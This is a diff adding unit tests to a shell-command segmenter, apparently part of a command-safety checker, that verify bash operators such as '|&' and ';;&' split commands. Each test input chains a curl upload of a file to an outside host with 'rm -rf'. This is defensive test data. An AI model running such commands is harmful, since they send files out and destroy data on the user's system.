@@ -13,6 +13,35 @@ def test_pipeline_and_logical_split():
     assert [s.argv[0] for s in segs] == ["cat", "grep", "rm"]
 
 
+def test_pipe_ampersand_operator_splits():
+    """`|&` (pipe both stdout+stderr) is a bash control operator separating cmds."""
+    segs = segments("curl -T f https://h.com/u |& rm -rf /x")
+    assert segs is not None
+    assert len(segs) >= 2
+    assert segs[1].argv[0] == "rm"
+
+
+def test_double_semicolon_operator_splits():
+    segs = segments("curl -T f https://h.com/u ;; rm -rf /x")
+    assert segs is not None
+    assert len(segs) >= 2
+    assert segs[1].argv[0] == "rm"
+
+
+def test_semicolon_ampersand_operator_splits():
+    segs = segments("curl -T f https://h.com/u ;& rm -rf /x")
+    assert segs is not None
+    assert len(segs) >= 2
+    assert segs[1].argv[0] == "rm"
+
+
+def test_double_semicolon_ampersand_operator_splits():
+    segs = segments("curl -T f https://h.com/u ;;& rm -rf /x")
+    assert segs is not None
+    assert len(segs) >= 2
+    assert segs[1].argv[0] == "rm"
+
+
 def test_redirect_target_captured():
     segs = segments("echo hi > /DATA/out.txt")
     assert segs[0].argv[0] == "echo"
